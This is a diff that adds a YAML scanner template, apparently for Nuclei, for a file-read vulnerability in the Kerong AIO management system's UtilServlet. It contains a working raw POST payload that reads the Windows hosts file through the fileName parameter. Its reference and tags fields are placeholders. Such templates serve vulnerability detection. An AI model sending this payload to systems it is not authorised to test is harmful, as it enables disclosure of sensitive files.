@@ -1,0 +1,29 @@
+id: kerong-fileread
+info:
+  name: kerong-fileread
+  author: apple
+  severity: medium
+  description: 科荣AIO管理系统是一款十分优秀的企业管理工具。科荣AIO管理系统 UtilServlet 文件读取漏洞，攻击者可利用该漏洞获取系统的敏感信息等。
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /UtilServlet HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
+        Accept: */*
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Connection: close
+        Cookie: JSESSIONID=226A127B74F873B5FDF629925324AC74
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 71
+
+        operation=readErrorExcel&fileName=C:/Windows/System32/drivers/etc/hosts
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'Copyright'
